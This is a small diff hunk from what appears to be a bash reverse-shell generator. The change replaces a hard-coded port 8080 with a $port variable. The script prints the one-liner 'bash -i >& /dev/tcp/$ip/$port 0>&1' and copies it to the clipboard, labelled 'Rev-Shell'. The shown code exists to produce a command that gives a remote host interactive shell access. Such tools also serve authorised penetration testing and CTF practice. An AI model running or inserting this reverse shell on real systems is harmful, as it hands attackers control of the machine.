@@ -47,7 +47,7 @@ echo ""
 echo -e "                          ${redColour}BASH ${endColour}"
 interface
 echo -e "${yellowColour}bash -i >& /dev/tcp/$ip/$port 0>&1 ${normalColour}"
-echo "bash -i >& /dev/tcp/$ip/8080 0>&1" | xclip -sel clip
+echo "bash -i >& /dev/tcp/$ip/$port 0>&1" | xclip -sel clip
 
 echo -e "${greenColour}Rev-Shell copied to clipboard ${normalColour}"
 exit 0
